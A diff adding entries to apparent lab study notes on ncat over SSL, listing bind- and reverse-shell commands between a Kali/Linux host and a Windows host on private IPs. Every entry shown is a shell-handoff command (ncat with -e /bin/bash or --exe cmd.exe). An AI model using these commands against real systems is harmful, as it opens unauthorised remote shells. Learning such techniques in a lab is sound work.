@@ -41,3 +41,11 @@ this case  Alice is srever but still we have cmd.exe access
 
 Alice(kali): ncat --allow 10.11.22.20 -nvlp 4444 --ssl
 bob:(windows): ncat -nv 10.11.0.204 4444 --ssl --exe cmd.exe
+
+4) revese shell:
+Alice(Linux) is server here : ncat --allow 10.11.22.20 -nvlp 4444 --ssl -e /bin/bash
+Bob(windows) is client: ncat -nv 10.11.0.204 4444 --ssl 
+
+5) resever Shell:
+Alice:ncat -nv 10.11.22.20 4444 --ssl -e /bin/bash
+Bob:ncat --allow 10.11.0.204 -nvlp 4444 --ssl
